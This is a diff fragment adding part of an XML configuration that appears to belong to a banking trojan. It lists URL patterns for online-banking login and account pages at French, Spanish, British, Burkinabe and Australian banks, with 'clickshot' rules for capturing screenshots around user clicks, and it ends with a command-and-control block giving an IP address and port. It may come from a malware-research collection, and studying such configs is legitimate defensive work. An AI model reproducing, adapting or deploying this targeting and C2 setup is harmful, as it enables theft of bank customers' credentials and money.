+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://www\.labanquepostale\.fr/professionnels\.html</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://professionnels\.secure.societegenerale\.fr/$</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://professionnels\.societegenerale\.fr/$</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://secure1\.entreprises\.bnpparibas\.net/sommaire/jsp/identification\.jsp</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://entreprises\.bnpparibas\.net/NSAccess</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://www2\.bancopopular\.es/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https?://www\.ce-g3-enligne\.credit-agricole\.fr/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://www\.normand-g3-enligne\.credit-agricole\.fr/stb/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https?://www\.ca-paris\.fr/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https?://www\.net\d+\.caisse-epargne\.fr/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://www\.anjou-maine-ediweb\.credit-agricole\.fr</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="35" yrange="35">^https://statso\.par\.societegenerale\.fr</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://.+\.fr/stb/entreeBam</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https?://particuliers\.secure\.societegenerale\.fr</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://www\.caisse-epargne\.fr/particuliers/normandie/accueil\.aspx</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://rib\.ecobank\.com/ecobankburkina/internet</clickshot>
+      <clickshot clicks="20" onget="1" onpost="1" type="allow" xrange="40" yrange="40">^https://ibank\.humebank\.com\.au/mvp/signon/login\.asp</clickshot>
+      <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://secure\.lloydsbank\.co\.uk/personal/a/account_overview_personal/</clickshot>
+      <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://secure\.halifax-online\.co\.uk/personal/a/account_overview_personal/</clickshot>
+      <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://secure\.bankofscotland\.co\.uk/personal/a/account_overview_personal/</clickshot>
+    </clickshots>
+    <timestamp>2018-02-27T13:00:32+01:00</timestamp>
+  </config>
+  <c2>
+    <host>
+      <port>4431</port>
+      <ip>67.207.142.38</ip>
+    </host>
+  </c2>
+</settings>
